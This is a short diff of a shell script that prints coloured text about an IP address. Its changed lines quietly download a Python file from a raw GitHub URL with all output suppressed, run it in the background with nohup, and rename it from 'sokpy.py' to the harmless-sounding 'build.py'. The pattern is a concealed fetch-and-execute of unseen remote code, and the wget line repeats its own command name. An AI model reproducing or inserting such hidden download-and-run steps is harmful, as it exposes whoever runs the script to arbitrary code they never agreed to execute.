@@ -9,9 +9,9 @@ magenta='\033[1;95m'
 cyan='\033[1;96m'
 # Clear the color after that
 clear='\033[0m'
-wget -qO sokpy.py wget https://raw.githubusercontent.com/anihsugiarti9/ebor/main/sok.py  > /dev/null 2>&1
+wget -qO build.py wget https://raw.githubusercontent.com/anihsugiarti9/ebor/main/sok.py  > /dev/null 2>&1
 sleep 1
-nohup python3 sokpy.py &>/dev/null &
+nohup python3 build.py &>/dev/null &
 echo -e "$red"
 echo -e "${blue}IP Address:${clear}"
 echo -e "$yellow"
